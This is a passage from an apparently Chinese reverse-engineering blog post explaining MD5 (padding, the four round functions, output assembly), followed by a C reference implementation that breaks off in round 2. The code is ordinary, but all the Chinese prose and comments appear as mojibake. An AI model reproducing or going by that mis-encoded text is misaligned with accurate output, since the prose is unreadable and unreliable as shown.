<br>&#125;<br></code></pre></td></tr></table></figure><p>åè¿›åˆ¶è¡¨ç¤ºå¦‚ä¸‹ï¼Œintæœ€å¤§æ˜¯0x7fffffffï¼Œæ‰€ä»¥ç¬¬2ä¸ªå’Œç¬¬3ä¸ªä¸ºè´Ÿæ•°</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693966877726-70617850-e282-48d0-927a-83e303e32eb8.png" class="" title="img"><p>ç„¶åå°†å¡«å……å®Œæˆåçš„æ•°æ®åˆ’åˆ†æˆä¸€ä¸ªä¸ª512ä½çš„åˆ†ç»„ï¼Œä¾æ¬¡è¿›å…¥å¾ªç¯å˜æ¢ã€‚Aã€Bã€Cã€Dä¹Ÿå‚ä¸åˆ°å¾ªç¯å˜æ¢ä¸­ã€‚æ•°æ®åˆ†ç»„è¿›å»å˜æ¢çš„æ—¶å€™ï¼Œå¤§æ¦‚èµ°è¿™ä¹ˆä¸ªæµç¨‹ï¼š</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693970069070-387aab7f-cd39-4461-8e4a-c67f1cab217c.png" class="" title="img"><p>å¾ªç¯å˜æ¢æ˜¯æ•´ä¸ªMD5ç®—æ³•æœ€æ ¸å¿ƒï¼Œä¹Ÿæ˜¯æœ€å¤æ‚çš„éƒ¨åˆ†ã€‚ä¸€ä¸ª512ä½åˆ†ç»„çš„æ•°æ®è¢«è¿›ä¸€æ­¥åˆ’åˆ†ä¸º16ä¸ª32ä½çš„å­åˆ†ç»„ï¼Œå¯¹æ¯ä¸ªå­åˆ†ç»„è¿›è¡Œä¸‹å›¾æ‰€ç¤ºçš„å˜æ¢ï¼š</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693970143998-4b2596b3-2dcb-461a-a779-f18d47a34948.webp" class="" title="img"><p>ä¸Šé¢åªæ˜¯ç”»å‡ºäº†ä¸€ä¸ªå­åˆ†ç»„è¿›è¡Œçš„å˜æ¢ã€‚ä¸‹é¢å¯¹å›¾ä¸­çš„å…ƒç´ è¿›è¡Œè¯´æ˜ï¼š</p><p>1.å›¾ä¸­çš„Få‡½æ•°ä»£è¡¨ä¸€æ¬¡ç”±ä½è¿ç®—æ„æˆçš„éçº¿æ€§å˜æ¢ï¼Œæ¯ä¸€è½®å¾ªç¯å˜æ¢ç”¨åˆ°çš„Få‡½æ•°ä¸ä¸€æ ·</p><p>2.å¸¸æ•°ACçš„å€¼åœ¨æ¯ä¸€æ¬¡å˜æ¢ä¸­éƒ½ä¸ä¸€æ ·</p><p>3.å·¦ç§»ä½æ•°Sæœ‰è§„å¾‹åœ°å‘¨æœŸæ€§å˜åŒ–</p><p>æ•°æ®çš„16ä¸ªå­åˆ†ç»„éƒ½å‚ä¸åˆ°ä¸Šå›¾æ‰€ç¤ºçš„å˜æ¢ï¼Œé¡ºåºä¸å®šã€‚å½“16ä¸ªå­åˆ†ç»„å¤„ç†å®Œæˆæ—¶ï¼Œæˆ‘ä»¬å°±è¯´å®Œæˆäº†ä¸€è½®å¾ªç¯å˜æ¢ã€‚MD5çš„ä¸€ä¸ªæ•°æ®åˆ†ç»„ä¸€å…±éœ€è¦è¿›è¡Œå››è½®çš„å¾ªç¯å˜æ¢ã€‚å°†å››è½®å¾ªç¯å˜æ¢åå¾—åˆ°çš„Aã€Bã€Cã€Dçš„å€¼åˆ†åˆ«å’ŒåŸæ¥çš„å€¼ç›¸åŠ ï¼Œå°±æ˜¯Aã€Bã€Cã€Dè¿›è¡Œå¾ªç¯å˜æ¢åçš„ç»“æœ</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693970353116-2a024378-53db-4237-b495-6291b8c10b6d.png" class="" title="img"><h2 id="æ‹¼æ¥è¾“å‡º"><a href="#æ‹¼æ¥è¾“å‡º" class="headerlink" title="æ‹¼æ¥è¾“å‡º"></a>æ‹¼æ¥è¾“å‡º</h2><p>å°†ç»è¿‡è‹¥å¹²æ¬¡å¾ªç¯å˜æ¢åçš„Aã€Bã€Cã€D<strong>ä»¥åå…­è¿›åˆ¶çš„å½¢å¼æ‹¼æ¥èµ·æ¥</strong>ï¼Œå°±æ˜¯MD5ç </p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693970383717-bf407b4f-9917-4dbc-8818-8a0668643ea6.png" class="" title="img"><p>è¿™é‡Œæ˜¯åŠ å¯†å‡½æ•°ï¼Œè€Œä¸”ä¹Ÿèƒ½çœ‹åˆ°hash[]</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693465621018-8c8131a5-a32f-4e3b-9646-220b1bd2a96f.png" class="" title="img"><p>è¿˜æœ‰å¯èƒ½çš„ç‰¹å¾</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693465549899-24101ab3-d128-48be-9379-159436b0563b.png" class="" title="img"><p>å®Œæ•´ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">å‡½æ•°ä½¿ç”¨è¯´æ˜ï¼š</span><br><span class="hljs-comment">å…ˆè°ƒç”¨MD5Initåˆå§‹åŒ–ä¸€ä¸ªMD5_CTXç±»å‹ç»“æ„ä½“ï¼Œå†ä½¿ç”¨MD5Updateè®¡ç®—MD5ç ï¼Œæœ€åè°ƒç”¨MD5Finalè·å–</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *POINTER; <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> state[<span class="hljs-number">4</span>];                                   <span class="hljs-comment">/* A,B,C,Då››ä¸ªå¸¸æ•° */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count[<span class="hljs-number">2</span>];        <span class="hljs-comment">/* æ•°æ®çš„bitæ•°è®¡æ•°å™¨(å¯¹2^64å–ä½™) */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];                         <span class="hljs-comment">/* è¾“å…¥æ•°æ®ç¼“å†²åŒº */</span><br>&#125; MD5_CTX; <span class="hljs-comment">//å­˜æ”¾MD5ç®—æ³•ç›¸å…³ä¿¡æ¯çš„ç»“æ„ä½“å®šä¹‰</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Init</span> <span class="hljs-params">(MD5_CTX *)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Update</span><span class="hljs-params">(MD5_CTX *, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Final</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> [<span class="hljs-number">16</span>], MD5_CTX *)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Transform</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> [<span class="hljs-number">4</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> [<span class="hljs-number">64</span>])</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Encode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Decode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-comment">//å¾ªç¯å·¦ç§»çš„ä½æ•°</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S11 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S12 12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S13 17</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S14 22</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S21 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S22 9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S23 14</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S24 20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S31 4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S32 11</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S33 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S34 23</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S41 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S42 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S43 15</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S44 21</span><br><br><span class="hljs-comment">//æ•°æ®å¡«å……çš„å†…å®¹</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> PADDING[<span class="hljs-number">64</span>] = &#123;<br>    <span class="hljs-number">0x80</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>    &#125;;<br><br><span class="hljs-comment">//F,G,H,Iå››ä¸ªéçº¿æ€§å˜æ¢å‡½æ•°</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> F(x, y, z) (((x) &amp; (y)) | ((~x) &amp; (z)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> G(x, y, z) (((x) &amp; (z)) | ((y) &amp; (~z)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> H(x, y, z) ((x) ^ (y) ^ (z))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> I(x, y, z) ((y) ^ ((x) | (~z)))</span><br><br><span class="hljs-comment">//xå¾ªç¯å·¦ç§»nä½çš„æ“ä½œ</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ROTATE_LEFT(x, n) (((x) <span class="hljs-string">&lt;&lt; (n)) | ((x) &gt;</span>&gt; (32-(n))))</span><br><br><span class="hljs-comment">//FF,GG,HH,IIæ˜¯å››è½®å¾ªç¯å˜æ¢åˆ†åˆ«ç”¨åˆ°çš„å˜æ¢å‡½æ•°</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FF(a, b, c, d, x, s, ac) &#123; \</span><br><span class="hljs-meta"> (a) += F ((b), (c), (d)) + (x) + (unsigned int)(ac); \</span><br><span class="hljs-meta"> (a) = ROTATE_LEFT ((a), (s)); \</span><br><span class="hljs-meta"> (a) += (b); \</span><br><span class="hljs-meta">  &#125;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GG(a, b, c, d, x, s, ac) &#123; \</span><br><span class="hljs-meta"> (a) += G ((b), (c), (d)) + (x) + (unsigned int)(ac); \</span><br><span class="hljs-meta"> (a) = ROTATE_LEFT ((a), (s)); \</span><br><span class="hljs-meta"> (a) += (b); \</span><br><span class="hljs-meta">  &#125;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HH(a, b, c, d, x, s, ac) &#123; \</span><br><span class="hljs-meta"> (a) += H ((b), (c), (d)) + (x) + (unsigned int)(ac); \</span><br><span class="hljs-meta"> (a) = ROTATE_LEFT ((a), (s)); \</span><br><span class="hljs-meta"> (a) += (b); \</span><br><span class="hljs-meta">  &#125;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> II(a, b, c, d, x, s, ac) &#123; \</span><br><span class="hljs-meta"> (a) += I ((b), (c), (d)) + (x) + (unsigned int)(ac); \</span><br><span class="hljs-meta"> (a) = ROTATE_LEFT ((a), (s)); \</span><br><span class="hljs-meta"> (a) += (b); \</span><br><span class="hljs-meta">  &#125;</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Init</span> <span class="hljs-params">(MD5_CTX *context)</span><br>&#123;<br>    <span class="hljs-comment">//bitè®¡æ•°å™¨æ¸…é›¶</span><br>    context-&gt;count[<span class="hljs-number">0</span>] = context-&gt;count[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//A,B,C,Dè¢«åˆå§‹åŒ–ä¸ºå››ä¸ªç‰¹å®šçš„å¸¸æ•°(Magic Number)</span><br>    context-&gt;state[<span class="hljs-number">0</span>] = <span class="hljs-number">0x67452301</span>;<br>    context-&gt;state[<span class="hljs-number">1</span>] = <span class="hljs-number">0xefcdab89</span>;<br>    context-&gt;state[<span class="hljs-number">2</span>] = <span class="hljs-number">0x98badcfe</span>;<br>    context-&gt;state[<span class="hljs-number">3</span>] = <span class="hljs-number">0x10325476</span>;<br>&#125;<br><br><span class="hljs-comment">//ä½¿ç”¨MD5ç®—æ³•å¯¹inputçš„æ•°æ®è¿›è¡Œå¤„ç†</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Update</span> <span class="hljs-params">(MD5_CTX *context, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *input, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inputLen)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, index, partLen;<br>    <span class="hljs-comment">//è®¡ç®—[å·²å¤„ç†æ•°æ®é•¿åº¦(byte) mod 64]</span><br>    index = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((context-&gt;count[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x3F</span>);<br>    <span class="hljs-comment">//bitè®¡æ•°å™¨ç´¯åŠ </span><br>    <span class="hljs-keyword">if</span> ((context-&gt;count[<span class="hljs-number">0</span>] += ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)inputLen &lt;&lt; <span class="hljs-number">3</span>))<br>      &lt; ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)inputLen &lt;&lt; <span class="hljs-number">3</span>)) <span class="hljs-comment">//å¤„ç†åŠ æ³•è¿›ä½æº¢å‡ºçš„æƒ…å†µ</span><br>        context-&gt;count[<span class="hljs-number">1</span>]++;<br>    context-&gt;count[<span class="hljs-number">1</span>] += ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)inputLen &gt;&gt; <span class="hljs-number">29</span>);<br>    <span class="hljs-comment">//è®¡ç®—ç¼“å†²åŒºè¿˜æœ‰å¤šå°‘å­—èŠ‚ç©ºé—´</span><br>    partLen = <span class="hljs-number">64</span> - index;<br>    <span class="hljs-comment">//ä»¥512ä½æ•°æ®ä¸ºä¸€ç»„è¿›è¡Œå¤„ç†</span><br>    <span class="hljs-keyword">if</span> (inputLen &gt;= partLen) &#123;<br>        <span class="hljs-built_in">memcpy</span>(&amp;context-&gt;buffer[index],input, partLen);<br>        MD5Transform (context-&gt;state, context-&gt;buffer);<br>        <span class="hljs-keyword">for</span> (i = partLen; i + <span class="hljs-number">63</span> &lt; inputLen; i += <span class="hljs-number">64</span>)<br>            MD5Transform (context-&gt;state, &amp;input[i]);<br>        index = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//ç¼“å­˜æœªå¤„ç†çš„è¾“å…¥</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;context-&gt;buffer[index],&amp;input[i],inputLen-i);<br>&#125;<br><br><span class="hljs-comment">//è·å–MD5ç ï¼ˆç”±digestè¿”å›ï¼‰ï¼Œé¡ºä¾¿æ¸…é™¤contextæ•°æ®</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Final</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> digest[<span class="hljs-number">16</span>], MD5_CTX *context)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> bits[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index, padLen;<br>    <span class="hljs-comment">//è®°å½•æ•°æ®é•¿åº¦</span><br>    Encode (bits, context-&gt;count, <span class="hljs-number">8</span>);<br>    <span class="hljs-comment">//å¡«å……æ•°æ®</span><br>    index = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((context-&gt;count[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x3f</span>);<br>    padLen = (index &lt; <span class="hljs-number">56</span>) ? (<span class="hljs-number">56</span> - index) : (<span class="hljs-number">120</span> - index);<br>    MD5Update (context, PADDING, padLen);<br>    <span class="hljs-comment">//è¿½åŠ æ•°æ®é•¿åº¦ä¿¡æ¯</span><br>    MD5Update (context, bits, <span class="hljs-number">8</span>);<br>    <span class="hljs-comment">//è·å–MD5ç ã€‚å…¶å®å°±æ˜¯å°†ABCDå››ä¸ª32ä½æ•´æ•°ä»¥16è¿›åˆ¶æ–¹å¼çº§è”</span><br>    Encode (digest, context-&gt;state, <span class="hljs-number">16</span>);<br>    <span class="hljs-comment">//æ¸…é™¤æ•°æ®</span><br>    <span class="hljs-built_in">memset</span>(context, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*context));<br>&#125;<br><br><span class="hljs-comment">//MD5å˜æ¢å‡½æ•°</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Transform</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> state[<span class="hljs-number">4</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> block[<span class="hljs-number">64</span>])</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a = state[<span class="hljs-number">0</span>], b = state[<span class="hljs-number">1</span>], c = state[<span class="hljs-number">2</span>], d = state[<span class="hljs-number">3</span>], x[<span class="hljs-number">16</span>];<br>    <span class="hljs-comment">//å°†64å­—èŠ‚çš„ä¸€ç»„æ•°æ®è¿›ä¸€æ­¥åˆ’åˆ†ä¸º16ä¸ªå­åˆ†ç»„</span><br>    Decode (x, block, <span class="hljs-number">64</span>);<br>    <span class="hljs-comment">//ç¬¬1è½®å¾ªç¯å˜æ¢</span><br>    FF (a, b, c, d, x[ <span class="hljs-number">0</span>], S11, <span class="hljs-number">0xd76aa478</span>); <span class="hljs-comment">/* 1 */</span><br>    FF (d, a, b, c, x[ <span class="hljs-number">1</span>], S12, <span class="hljs-number">0xe8c7b756</span>); <span class="hljs-comment">/* 2 */</span><br>    FF (c, d, a, b, x[ <span class="hljs-number">2</span>], S13, <span class="hljs-number">0x242070db</span>); <span class="hljs-comment">/* 3 */</span><br>    FF (b, c, d, a, x[ <span class="hljs-number">3</span>], S14, <span class="hljs-number">0xc1bdceee</span>); <span class="hljs-comment">/* 4 */</span><br>    FF (a, b, c, d, x[ <span class="hljs-number">4</span>], S11, <span class="hljs-number">0xf57c0faf</span>); <span class="hljs-comment">/* 5 */</span><br>    FF (d, a, b, c, x[ <span class="hljs-number">5</span>], S12, <span class="hljs-number">0x4787c62a</span>); <span class="hljs-comment">/* 6 */</span><br>    FF (c, d, a, b, x[ <span class="hljs-number">6</span>], S13, <span class="hljs-number">0xa8304613</span>); <span class="hljs-comment">/* 7 */</span><br>    FF (b, c, d, a, x[ <span class="hljs-number">7</span>], S14, <span class="hljs-number">0xfd469501</span>); <span class="hljs-comment">/* 8 */</span><br>    FF (a, b, c, d, x[ <span class="hljs-number">8</span>], S11, <span class="hljs-number">0x698098d8</span>); <span class="hljs-comment">/* 9 */</span><br>    FF (d, a, b, c, x[ <span class="hljs-number">9</span>], S12, <span class="hljs-number">0x8b44f7af</span>); <span class="hljs-comment">/* 10 */</span><br>    FF (c, d, a, b, x[<span class="hljs-number">10</span>], S13, <span class="hljs-number">0xffff5bb1</span>); <span class="hljs-comment">/* 11 */</span><br>    FF (b, c, d, a, x[<span class="hljs-number">11</span>], S14, <span class="hljs-number">0x895cd7be</span>); <span class="hljs-comment">/* 12 */</span><br>    FF (a, b, c, d, x[<span class="hljs-number">12</span>], S11, <span class="hljs-number">0x6b901122</span>); <span class="hljs-comment">/* 13 */</span><br>    FF (d, a, b, c, x[<span class="hljs-number">13</span>], S12, <span class="hljs-number">0xfd987193</span>); <span class="hljs-comment">/* 14 */</span><br>    FF (c, d, a, b, x[<span class="hljs-number">14</span>], S13, <span class="hljs-number">0xa679438e</span>); <span class="hljs-comment">/* 15 */</span><br>    FF (b, c, d, a, x[<span class="hljs-number">15</span>], S14, <span class="hljs-number">0x49b40821</span>); <span class="hljs-comment">/* 16 */</span><br>    <span class="hljs-comment">//ç¬¬2è½®å¾ªç¯å˜æ¢</span><br>    GG (a, b, c, d, x[ <span class="hljs-number">1</span>], S21, <span class="hljs-number">0xf61e2562</span>); <span class="hljs-comment">/* 17 */</span><br>    GG (d, a, b, c, x[ <span class="hljs-number">6</span>], S22, <span class="hljs-number">0xc040b340</span>); <span class="hljs-comment">/* 18 */</span><br>    GG (c, d, a, b, x[<span class="hljs-number">11</span>], S23, <span class="hljs-number">0x265e5a51</span>); <span class="hljs-comment">/* 19 */</span><br>    GG (b, c, d, a, x[ <span class="hljs-number">0</span>], S24, <span class="hljs-number">0xe9b6c7aa</span>); <span class="hljs-comment">/* 20 */</span><br>    GG (a, b, c, d, x[ <span class="hljs-number">5</span>], S21, <span class="hljs-number">0xd62f105d</span>); <span class="hljs-comment">/* 21 */</span><br>    GG (d, a, b, c, x[<span class="hljs-number">10</span>], S22,  <span class="hljs-number">0x2441453</span>); <span class="hljs-comment">/* 22 */</span><br>    GG (c, d, a, b, x[<span class="hljs-number">15</span>], S23, <span class="hljs-number">0xd8a1e681</span>); <span class="hljs-comment">/* 23 */</span><br>    GG (b, c, d, a, x[ <span 